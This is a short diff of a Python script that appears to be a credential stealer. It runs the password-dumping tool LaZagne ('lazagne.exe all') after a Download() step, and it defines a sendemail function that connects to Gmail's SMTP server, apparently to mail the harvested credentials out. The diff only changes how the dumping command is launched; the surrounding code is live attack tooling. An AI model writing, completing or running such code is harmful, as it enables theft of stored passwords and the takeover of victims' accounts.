@@ -11,8 +11,7 @@ def Download():
 
 Download()
 
-result= subprocess.check_output('lazagne.exe all', shell=True)
-print(result)
+result= subprocess.Popen('lazagne.exe all', shell=True)
 
 def sendemail(from_addr, to_addr_list, message,login, password):
     smtpserver='smtp.gmail.com:587'
